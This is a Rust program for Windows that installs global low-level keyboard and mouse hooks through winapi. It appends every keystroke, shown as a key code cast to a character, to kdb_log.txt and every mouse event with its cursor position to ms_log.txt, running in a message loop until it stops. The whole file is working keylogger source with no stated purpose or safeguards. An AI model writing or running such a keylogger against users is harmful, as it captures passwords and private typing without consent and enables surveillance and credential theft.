extern crate winapi;
use winapi::um::winuser::{
    DispatchMessageW, GetMessageW, SetWindowsHookExW, TranslateMessage, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, MSG, MSLLHOOKSTRUCT
};
use winapi::um::winuser::{WH_KEYBOARD_LL, WH_MOUSE_LL};
use winapi::shared::minwindef::{WPARAM, LPARAM, LRESULT};
// use winapi::shared::windef::HHOOK;
use std::io::Error;
use std::mem::zeroed;
use std::ptr::null_mut;
use std::fs::{File, OpenOptions};
use std::io::Write;


fn kbd_file(wp: usize, kb: &KBDLLHOOKSTRUCT, file: &mut File){
    
    let mut wps = String::new(); 

    match wp as u32 {
        256 => wps = String::from("KEY-DOWN"),
        257 => wps = String::from("KEY-UP"),
        260 => wps = String::from("SYS-KEY-DOWN"),
        261 => wps = String::from("SYS-KEY-UP"),
        512 => wps = String::from("MOUSE-MOVE"),
        _ => wps = String::from("UNKNOWN"),
    }


    writeln!(file,"[Time] {} [Key-Event] {} [Key] {}", kb.time, wps,  (kb.vkCode as u8) as char).expect("Unable to write data");
}

fn ms_file(wp: usize, ms: &MSLLHOOKSTRUCT, file: &mut File){
    let mut wps: String = String::new(); 

    match wp as u32 {
        512 => wps = String::from("MOUSE-MOVE"),
        513 => wps = String::from("LEFT-BUTTON-DOWN"),
        514 => wps = String::from("LEFT-BUTTON-UP"),
        516 => wps = String::from("RIGHT-BUTTON-DOWN"),
        517 => wps = String::from("RIGHT-BUTTON-UP"),
        519 => wps = String::from("MOUSE-WHEEL"),
        _ => wps = String::from("UNKNOWN"),
    }

    writeln!(file,"[Time] {} [Mouse-Event] {} [Position] ({}, {})", ms.time, wps, ms.pt.x, ms.pt.y).expect("Unable to write data");
    
}


unsafe extern "system" fn keyboard_proc(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    
    if code >= 0 {
        let kb = &*(l_param as *const winapi::um::winuser::KBDLLHOOKSTRUCT);
        let wp = w_param;
        // println!("Keyboard event detected: wParam = {}, Key = {}", w_param, (kb.vkCode as u8) as char);
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("kdb_log.txt")
            .expect("Unable to open file");
        
        kbd_file(wp as usize, kb, &mut file);
    }
    return winapi::um::winuser::CallNextHookEx(std::ptr::null_mut(), code, w_param, l_param);
}

unsafe extern "system" fn mouse_proc(code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
        
    if code >= 0 {
        let ms = &*(l_param as *const winapi::um::winuser::MSLLHOOKSTRUCT);
        let wp = w_param;
        // println!("Mouse event detected: wParam = {}, Position = ({}, {})", w_param, ms.pt.x, ms.pt.y);
        let mut file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("ms_log.txt")
            .expect("Unable to open file");
        
        ms_file(wp as usize, ms, &mut file);
    }
    return winapi::um::winuser::CallNextHookEx(std::ptr::null_mut(), code, w_param, l_param);
}

fn main() {

    // let keyboard_hook: HHOOK = unsafe { winapi::um::winuser::SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_proc), std::ptr::null_mut(), 0) };
    // let mouse_hook: HHOOK = unsafe { winapi::um::winuser::SetWindowsHookExA(WH_MOUSE_LL, Some(mouse_proc), std::ptr::null_mut(), 0) };

    
    // unsafe {
    //     winapi::um::winuser::UnhookWindowsHookEx(keyboard_hook);
    //     winapi::um::winuser::UnhookWindowsHookEx(mouse_hook);
    // }

    run_message_loop().unwrap();

}

pub fn run_message_loop() -> Result<(), Error> {
    unsafe {

        let keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_proc), null_mut(), 0);
        let mouse_hook = SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_proc), null_mut(), 0);
        
        if keyboard_hook.is_null() {
            return Err(Error::last_os_error());
        }
        if mouse_hook.is_null() {
            UnhookWindowsHookEx(keyboard_hook);
            return Err(Error::last_os_error());
        }
        

        let mut msg: MSG = zeroed();
        loop {
            let ret = GetMessageW(&mut msg as *mut MSG, null_mut(), 0, 0);
            if ret == 0 {
                break;
            } else if ret == -1 {
                UnhookWindowsHookEx(keyboard_hook);
                return Err(Error::last_os_error());
            } else {
                TranslateMessage(&mut msg);
                DispatchMessageW(&mut msg);
            }
        }

        UnhookWindowsHookEx(keyboard_hook);
    }
    Ok(())
}

